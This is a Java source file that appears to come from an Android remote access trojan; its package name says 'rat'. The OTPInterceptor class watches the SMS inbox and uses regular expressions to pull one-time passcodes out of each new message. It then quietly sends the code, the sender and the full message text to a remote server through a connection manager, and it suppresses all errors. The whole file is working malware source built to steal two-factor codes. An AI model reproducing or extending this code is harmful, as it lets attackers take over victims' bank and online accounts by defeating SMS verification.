package com.wexow.rat.managers;

import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.os.Looper;

import com.wexow.rat.core.ConnectionManager;

import org.json.JSONObject;

import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class OTPInterceptor {
    private static ContentObserver observer;
    private static long lastSmsId = -1;

    private static final Pattern P1 = Pattern.compile("\\b(\\d{4,8})\\b");
    private static final Pattern P2 = Pattern.compile(
        "(?:code|otp|verification)[:\\s]*(\\d{4,8})",
        Pattern.CASE_INSENSITIVE);

    public static void start(Context ctx) {
        if (observer != null) return;

        observer = new ContentObserver(new Handler(Looper.getMainLooper())) {
            @Override
            public void onChange(boolean self) { checkNew(ctx); }
        };
        ctx.getContentResolver().registerContentObserver(
            Uri.parse("content://sms/"), true, observer);
    }

    public static void stop(Context ctx) {
        if (observer != null) {
            ctx.getContentResolver().unregisterContentObserver(observer);
            observer = null;
        }
    }

    private static void checkNew(Context ctx) {
        try {
            Cursor c = ctx.getContentResolver().query(
                Uri.parse("content://sms/inbox"),
                new String[]{"_id", "address", "body", "date"},
                null, null, "date DESC LIMIT 1");
            if (c != null && c.moveToFirst()) {
                long id = c.getLong(0);
                if (id != lastSmsId) {
                    lastSmsId = id;
                    String sender = c.getString(1);
                    String body = c.getString(2);
                    String otp = extract(body);
                    if (otp != null) {
                        JSONObject jo = new JSONObject();
                        jo.put("type", "otp");
                        jo.put("otp", otp);
                        jo.put("sender", sender);
                        jo.put("msg", body);
                        ConnectionManager.send(jo.toString());
                    }
                }
                c.close();
            }
        } catch (Exception ignored) {}
    }

    private static String extract(String msg) {
        if (msg == null) return null;
        Matcher m = P2.matcher(msg);
        if (m.find()) return m.group(1);
        m = P1.matcher(msg);
        if (m.find()) return m.group(1);
        return null;
    }
}